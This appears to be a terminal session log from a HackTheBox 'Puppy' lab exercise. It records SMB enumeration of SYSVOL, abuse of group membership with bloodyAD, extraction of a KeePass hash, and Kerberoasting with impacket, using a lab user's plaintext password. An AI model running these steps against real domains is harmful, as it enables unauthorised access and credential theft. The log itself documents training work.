+[2026-01-28 13:49:57] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> dir
+[2026-01-28 13:49:57] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:49:57] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:49:57] [w=0:tmux] [p=%0] [OUT] Windows NT                          D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:49:57] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:50:01] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> cd Window
+[2026-01-28 13:50:03] [w=0:tmux] [p=%0] [OUT] s NT\
+[2026-01-28 13:50:03] [w=0:tmux] [p=%0] [OUT] cd \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+[2026-01-28 13:50:04] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> dir
+[2026-01-28 13:50:04] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:50:04] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:04] [w=0:tmux] [p=%0] [OUT] Windows NT                          D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:50:04] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:50:09] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> cd Win'Windo
+[2026-01-28 13:50:13] [w=0:tmux] [p=%0] [OUT] ws NT'
+[2026-01-28 13:50:13] [w=0:tmux] [p=%0] [OUT] cd \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\'Windows\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+[2026-01-28 13:50:17] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> dir
+[2026-01-28 13:50:17] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:50:17] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:17] [w=0:tmux] [p=%0] [OUT] Windows NT                          D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:50:17] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:50:23] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> cd Windows NT\
+[2026-01-28 13:50:23] [w=0:tmux] [p=%0] [OUT] cd \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+[2026-01-28 13:50:31] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> ccd ..
+[2026-01-28 13:50:31] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> dir
+[2026-01-28 13:50:31] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:31] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:50:31] [w=0:tmux] [p=%0] [OUT] Microsoft                           D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:50:31] [w=0:tmux] [p=%0] [OUT] Registry.pol                        A     2786  Wed Feb 19 06:49:00 2025
+[2026-01-28 13:50:31] [w=0:tmux] [p=%0] [OUT] Scripts                             D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:32] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:50:36] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd Scripts\
+[2026-01-28 13:50:37] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\> dir
+[2026-01-28 13:50:37] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:37] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:37] [w=0:tmux] [p=%0] [OUT] Shutdown                            D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:37] [w=0:tmux] [p=%0] [OUT] Startup                             D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:37] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:50:41] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\> cd Shutdown
+[2026-01-28 13:50:45] [w=0:tmux] [p=%0] [OUT] \
+[2026-01-28 13:50:46] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\Shutdown\> di
+[2026-01-28 13:50:46] [w=0:tmux] [p=%0] [OUT] r
+[2026-01-28 13:50:46] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:46] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:47] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:50:48] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\Shutdown\> cd
+[2026-01-28 13:50:48] [w=0:tmux] [p=%0] [OUT] ..
+[2026-01-28 13:50:51] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\> cd Startup
+[2026-01-28 13:50:52] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\Startup\> dir
+[2026-01-28 13:50:52] [w=0:tmux] [p=%0] [OUT] r
+[2026-01-28 13:50:52] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:52] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:50:52] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:50:53] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\Startup\> cd
+[2026-01-28 13:50:54] [w=0:tmux] [p=%0] [OUT] ..
+[2026-01-28 13:51:03] [pane=%1] [CMD_START] ll
+[2026-01-28 13:51:03] [w=1:tmux] [p=%1] [OUT] total 8
+[2026-01-28 13:51:03] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 13:47 {31B2F340-016D-11D2-945F-00C04FB984F9}
+[2026-01-28 13:51:03] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30  167 Jan 28  2026 credentials.md
+[2026-01-28 13:51:15] [pane=%1] [CMD_START] cd ../nmap
+[2026-01-28 13:51:16] [pane=%1] [CMD_START] ll
+[2026-01-28 13:51:16] [w=1:tmux] [p=%1] [OUT] total 12
+[2026-01-28 13:51:16] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30 1443 Jan 28  2026 puppyNmapOpenPorts.txt
+[2026-01-28 13:51:16] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30 2830 Jan 28 11:09 puppyNmapServicesVersions.txt
+[2026-01-28 13:51:16] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30 2786 Jan 28 13:49 Registry.pol
+[2026-01-28 13:51:23] [pane=%1] [CMD_START] cat Registry.pol
+[2026-01-28 13:51:35] [pane=%1] [CMD_START] strings Registry.pol
+[2026-01-28 13:55:39] [pane=%1] [CMD_START] mv Registry.pol ../loot/{\{31B2F340-016D-11D2-945F-00C04FB984F9\}
+[2026-01-28 13:57:36] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\> cd ..
+[2026-01-28 13:57:37] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> dir
+[2026-01-28 13:57:37] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:57:37] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:57:37] [w=0:tmux] [p=%0] [OUT] Microsoft                           D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:57:37] [w=0:tmux] [p=%0] [OUT] Registry.pol                        A     2786  Wed Feb 19 06:49:00 2025
+[2026-01-28 13:57:37] [w=0:tmux] [p=%0] [OUT] Scripts                             D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:57:37] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:57:41] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd ..
+[2026-01-28 13:57:44] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd dir
+[2026-01-28 13:57:45] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:57:45] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:57:45] [w=0:tmux] [p=%0] [OUT] GPT.INI                             A       22  Wed Feb 19 06:49:00 2025
+[2026-01-28 13:57:45] [w=0:tmux] [p=%0] [OUT] MACHINE                             D        0  Wed Feb 19 06:49:00 2025
+[2026-01-28 13:57:45] [w=0:tmux] [p=%0] [OUT] USER                                D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:57:45] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:57:54] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd UserSER\
+[2026-01-28 13:57:55] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\> dir
+[2026-01-28 13:57:55] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:57:55] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:57:55] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:57:57] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\> cd ..
+[2026-01-28 13:57:59] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd ..
+[2026-01-28 13:58:00] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\> dir
+[2026-01-28 13:58:00] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:58:00] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:46:56 2025
+[2026-01-28 13:58:00] [w=0:tmux] [p=%0] [OUT] {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:58:00] [w=0:tmux] [p=%0] [OUT] {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:58:00] [w=0:tmux] [p=%0] [OUT] {841B611C-9F3B-4090-BA0C-2AE4D6C02AF8}      D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:58:00] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:58:07] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\> cd {6AC1786C-016F-11D2-945F-00C04fB984F9}\
+[2026-01-28 13:58:08] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> dir
+[2026-01-28 13:58:08] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:58:08] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:58:08] [w=0:tmux] [p=%0] [OUT] GPT.INI                             A       23  Wed May 14 12:53:36 2025
+[2026-01-28 13:58:08] [w=0:tmux] [p=%0] [OUT] MACHINE                             D        0  Mon May 12 19:50:46 2025
+[2026-01-28 13:58:08] [w=0:tmux] [p=%0] [OUT] USER                                D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:58:08] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:58:16] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> cd USER\
+[2026-01-28 13:58:16] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER\> dir
+[2026-01-28 13:58:16] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:58:16] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:58:17] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:58:20] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER\> cd ..
+[2026-01-28 13:58:22] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> tree
+[2026-01-28 13:58:22] [w=0:tmux] [p=%0] [OUT] tree: command not found
+[2026-01-28 13:58:30] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> dir \/f /a
+[2026-01-28 13:58:30] [w=0:tmux] [p=%0] [OUT] NT_STATUS_NO_SUCH_FILE listing \f
+[2026-01-28 13:58:35] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> dir /a
+[2026-01-28 13:58:35] [w=0:tmux] [p=%0] [OUT] NT_STATUS_NO_SUCH_FILE listing \a
+[2026-01-28 13:59:13] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> smbtree
+[2026-01-28 13:59:13] [w=0:tmux] [p=%0] [OUT] smbtree: command not found
+[2026-01-28 14:00:42] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> smbtreedir /asmbtreedir
+[2026-01-28 14:00:42] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 14:00:42] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Tue May 13 19:42:57 2025
+[2026-01-28 14:00:42] [w=0:tmux] [p=%0] [OUT] GPT.INI                             A       23  Wed May 14 12:53:36 2025
+[2026-01-28 14:00:42] [w=0:tmux] [p=%0] [OUT] MACHINE                             D        0  Mon May 12 19:50:46 2025
+[2026-01-28 14:00:42] [w=0:tmux] [p=%0] [OUT] USER                                D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 14:00:42] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641635 blocks available
+[2026-01-28 14:00:52] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> cd exit
+[2026-01-28 14:01:01] [pane=%0] [CMD_START] cd ../loot
+[2026-01-28 14:01:03] [pane=%0] [CMD_START] ll
+[2026-01-28 14:01:03] [w=0:tmux] [p=%0] [OUT] total 12
+[2026-01-28 14:01:03] [w=0:tmux] [p=%0] [OUT] -rw-r--r-- 1 b7h30 b7h30 2786 Jan 28 13:49 {{31B2F340-016D-11D2-945F-00C04FB984F9}
+[2026-01-28 14:01:03] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 13:47 {31B2F340-016D-11D2-945F-00C04FB984F9}
+[2026-01-28 14:01:03] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30  167 Jan 28  2026 credentials.md
+[2026-01-28 14:01:14] [w=0:tmux] [p=%0] [OUT] Completing file
+[2026-01-28 14:01:14] [w=0:tmux] [p=%0] [OUT] \{\{31B2F340-016D-11D2-945F-00C04FB984F9\}  credentials.md
+[2026-01-28 14:01:14] [w=0:tmux] [p=%0] [OUT] \{31B2F340-016D-11D2-945F-00C04FB984F9\}/
+[2026-01-28 14:01:19] [w=0:tmux] [p=%0] [OUT] cat {{{{{3{3cat {{3
+[2026-01-28 14:01:19] [w=0:tmux] [p=%0] [OUT] Completing `file'
+[2026-01-28 14:01:20] [w=0:tmux] [p=%0] [OUT] cat {{3cat {{3cat {{3
+[2026-01-28 14:01:20] [w=0:tmux] [p=%0] [OUT] Completing `file'
+[2026-01-28 14:01:20] [w=0:tmux] [p=%0] [OUT] cat {{3cat {{3cat {{3
+[2026-01-28 14:01:20] [w=0:tmux] [p=%0] [OUT] Completing `file'
+[2026-01-28 14:01:26] [w=0:tmux] [p=%0] [OUT] cat {{3cat {{3   certipyOutput.txt{                {{{{{{
+[2026-01-28 14:01:26] [w=0:tmux] [p=%0] [OUT] Completing file
+[2026-01-28 14:01:26] [w=0:tmux] [p=%0] [OUT] \{\{31B2F340-016D-11D2-945F-00C04FB984F9\}  credentials.md
+[2026-01-28 14:01:26] [w=0:tmux] [p=%0] [OUT] \{31B2F340-016D-11D2-945F-00C04FB984F9\}/
+[2026-01-28 14:01:40] [w=0:tmux] [p=%0] [OUT] cat {{{{  certipyOutput.txt\{\{31B2F340-016D-11D2-945F-00C04FB984F9\}\{\{31B2F340-016D-11D2-945F-00C04FB984F9\}
+[2026-01-28 14:01:40] [pane=%0] [CMD_START] cat \{\{31B2F340-016D-11D2-945F-00C04FB984F9\}
+[2026-01-28 14:02:04] [pane=%0] [CMD_START] rm \{\{31B2F340-016D-11D2-945F-00C04FB984F9\}
+[2026-01-28 14:02:06] [pane=%0] [CMD_START] ll
+[2026-01-28 14:03:18] [pane=%0] [CMD_START] mv \{31B2F340-016D-11D2-945F-00C04FB984F9\} 31B2F340-016D-11D2-945F-00C04FB984F9
+[2026-01-28 14:03:20] [pane=%0] [CMD_START] ll
+[2026-01-28 14:04:05] [pane=%0] [CMD_START] mkdir 6AC1786C-016F-11D2-945F-00C04fB984F9
+[2026-01-28 14:04:22] [pane=%0] [CMD_START] mkdir 841B611C-9F3B-4090-BA0C-2AE4D6C02AF8
+[2026-01-28 14:05:37] [pane=%0] [CMD_START] cd 6AC1786C-016F-11D2-945F-00C04fB984F9
+[2026-01-28 14:05:42] [pane=%0] [CMD_START] smbclient //10.129.232.75/SYSVOL -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 14:09:23] [pane=%0] [CMD_START] cd ../841B611C-9F3B-4090-BA0C-2AE4D6C02AF8
+[2026-01-28 14:09:25] [pane=%0] [CMD_START] smbclient //10.129.232.75/SYSVOL -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 14:10:26] [pane=%0] [CMD_START] cd ..
+[2026-01-28 14:10:28] [pane=%0] [CMD_START] l
+[2026-01-28 14:10:38] [pane=%0] [CMD_START] cd ..
+[2026-01-28 14:10:46] [pane=%0] [CMD_START] ll
+[2026-01-28 14:10:49] [pane=%0] [CMD_START] cd loot
+[2026-01-28 14:10:50] [pane=%0] [CMD_START] dir
+[2026-01-28 14:10:51] [pane=%0] [CMD_START] ll
+[2026-01-28 14:10:54] [pane=%0] [CMD_START] cd 6AC1786C-016F-11D2-945F-00C04fB984F9
+[2026-01-28 14:10:55] [pane=%0] [CMD_START] ll
+[2026-01-28 14:11:03] [pane=%0] [CMD_START] strings comment.cmtx
+[2026-01-28 14:11:53] [pane=%0] [CMD_START] ll
+[2026-01-28 14:12:05] [pane=%0] [CMD_START] cat GPT.INI
+[2026-01-28 14:12:14] [pane=%0] [CMD_START] cat GptTmpl.inf
+[2026-01-28 14:13:21] [pane=%0] [CMD_START] ll
+[2026-01-28 14:13:30] [pane=%0] [CMD_START] cat Registry.pol
+[2026-01-28 14:14:58] [pane=%0] [CMD_START] cd ..
+[2026-01-28 14:15:01] [pane=%0] [CMD_START] cd 841B611C-9F3B-4090-BA0C-2AE4D6C02AF8
+[2026-01-28 14:15:02] [pane=%0] [CMD_START] dir
+[2026-01-28 14:15:07] [pane=%0] [CMD_START] cat GPT.INI
+[2026-01-28 14:15:12] [pane=%0] [CMD_START] cat Registry.pol
+[2026-01-28 14:39:03] [pane=%1] [CMD_START] cd ..
+[2026-01-28 14:42:59] [pane=%1] [CMD_START] bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember 'Developers' 'levi.james'
+[2026-01-28 14:43:34] [pane=%0] [CMD_START] cd ..
+[2026-01-28 14:44:08] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 14:57:01] [pane=%1] [CMD_START] cd loot
+[2026-01-28 14:57:02] [pane=%1] [CMD_START] ll
+[2026-01-28 14:57:04] [pane=%1] [CMD_START] cd 31B2F340-016D-11D2-945F-00C04FB984F9
+[2026-01-28 14:57:08] [pane=%1] [CMD_START] regpol
+[2026-01-28 14:57:27] [pane=%1] [CMD_START] sudo apt install python3-regpol
+[2026-01-28 15:08:14] [pane=%1] [CMD_START] strings ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/*/Registry.pol | grep  
+  -v "^[[:space:]]*$"
+[2026-01-28 15:16:33] [pane=%1] [CMD_START] strings ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/31B2F340-016D-11D2-945F-00C04FB984F9/GPT.INI/Registry.pol | grep -v "^[[:space:]]*$"
+[2026-01-28 15:16:36] [pane=%1] [CMD_START] ll
+[2026-01-28 15:16:38] [pane=%1] [CMD_START] cd ..
+[2026-01-28 15:16:40] [pane=%1] [CMD_START] ll
+[2026-01-28 15:16:46] [pane=%1] [CMD_START] cd ../nmap
+[2026-01-28 15:16:47] [pane=%1] [CMD_START] ll
+[2026-01-28 15:22:10] [pane=%1] [CMD_START] cd 3
+[2026-01-28 15:22:13] [pane=%1] [CMD_START] cd 3
+[2026-01-28 15:22:21] [pane=%1] [CMD_START] cd loot
+[2026-01-28 15:22:22] [pane=%1] [CMD_START] ll
+[2026-01-28 15:22:25] [pane=%1] [CMD_START] cd ../loot
+[2026-01-28 15:22:26] [pane=%1] [CMD_START] dir
+[2026-01-28 15:22:31] [pane=%1] [CMD_START] cd 31B2F340-016D-11D2-945F-00C04FB984F9
+[2026-01-28 15:22:32] [pane=%1] [CMD_START] dir
+[2026-01-28 15:22:34] [pane=%1] [CMD_START] cd ..
+[2026-01-28 15:23:22] [pane=%1] [CMD_START] cd 6AC1786C-016F-11D2-945F-00C04fB984F9
+[2026-01-28 15:23:23] [pane=%1] [CMD_START] dir
+[2026-01-28 15:23:29] [pane=%1] [CMD_START] strings ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/31B2F340-016D-11D2-945F-00C04FB984F9/GPT.INI/Registry.pol | grep -v "^[[:space:]]*$"
+[2026-01-28 15:23:57] [pane=%1] [CMD_START] strings ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/6AC1786C-016F-11D2-945F-00C04fB984F9/Registry.pol | grep -v "^[[:space:]]*$"
+[2026-01-28 15:28:03] [pane=%1] [CMD_START] cd ..
+[2026-01-28 15:28:05] [pane=%1] [CMD_START] cd 841B611C-9F3B-4090-BA0C-2AE4D6C02AF8
+[2026-01-28 15:28:26] [pane=%1] [CMD_START] strings ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/841B611C-9F3B-4090-BA0C-2AE4D6C02AF8/Registry.pol | grep -v "^[[:space:]]*$"
+[2026-01-28 15:28:47] [pane=%1] [CMD_START] ll
+[2026-01-28 15:28:54] [pane=%1] [CMD_START] cd ../6AC1786C-016F-11D2-945F-00C04fB984F9
+[2026-01-28 15:28:56] [pane=%1] [CMD_START] ll
+[2026-01-28 15:29:02] [pane=%1] [CMD_START] cat GptTmpl.inf
+[2026-01-28 15:29:42] [pane=%1] [CMD_START] cat GptTmpl.inf | grep (SeBackupPrivilege, SeRestorePrivilege, SeImpersonatePrivilege)
+[2026-01-28 15:29:54] [pane=%1] [CMD_START] cat GptTmpl.inf | grep (SeBackupPrivilege,SeRestorePrivilege,SeImpersonatePrivilege)
+[2026-01-28 15:30:05] [pane=%1] [CMD_START] cat GptTmpl.inf | grep [SeBackupPrivilege,SeRestorePrivilege,SeImpersonatePrivilege]
+[2026-01-28 15:30:17] [pane=%1] [CMD_START] cat GptTmpl.inf | grep SeBackupPrivilege
+[2026-01-28 15:30:51] [pane=%1] [CMD_START] cat GptTmpl.inf | grep SeBackupPrivilege
+[2026-01-28 15:33:32] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 15:45:41] [pane=%1] [CMD_START] bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember 'Developers' 'levi.james'
+[2026-01-28 15:45:53] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 16:03:03] [pane=%1] [CMD_START] cd ..
+[2026-01-28 16:03:04] [pane=%1] [CMD_START] dir
+[2026-01-28 16:03:05] [pane=%1] [CMD_START] ll
+[2026-01-28 16:03:22] [pane=%1] [CMD_START] keepass2john recovery.kdbx
+[2026-01-28 16:05:31] [pane=%1] [CMD_START] keepass2john recovery.kdbx > keepass.hash
+[2026-01-28 16:36:27] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 16:36:59] [pane=%0] [CMD_START] bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember 'Developers' 'levi.james'
+[2026-01-28 16:37:02] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 16:45:12] [pane=%1] [CMD_START] sudo apt install kpcli
+[2026-01-28 16:46:17] [pane=%1] [CMD_START] kpcli --kbd=recovery.kdbx
+[2026-01-28 16:46:27] [pane=%1] [CMD_START] kpcli --kdb=recovery.kdbx
+[2026-01-28 16:46:54] [pane=%1] [CMD_START] kpcli help import
+[2026-01-28 16:51:49] [pane=%1] [CMD_START] keepass2john recovery.kdbx
+[2026-01-28 16:54:11] [pane=%1] [CMD_START] ls ../nmap/puppyNmapServicesVersions.txt
+[2026-01-28 16:54:18] [pane=%1] [CMD_START] cat ../nmap/puppyNmapServicesVersions.txt
+[2026-01-28 17:02:31] [pane=%1] [CMD_START] impacket-GetUserSPNs puppy.htb/levi.james:'KingofAkron2025!' -dc-ip 10.129.232.75 -request
+[2026-01-28 17:02:59] [pane=%1] [CMD_START] impacket-GetUserSPNs puppy.htb/levi.james:'KingofAkron2025!' -dc-ip 10.129.232.75 -request
+[2026-01-28 17:03:30] [pane=%1] [CMD_START] ll
+[2026-01-28 17:03:34] [pane=%1] [CMD_START] kpcli 
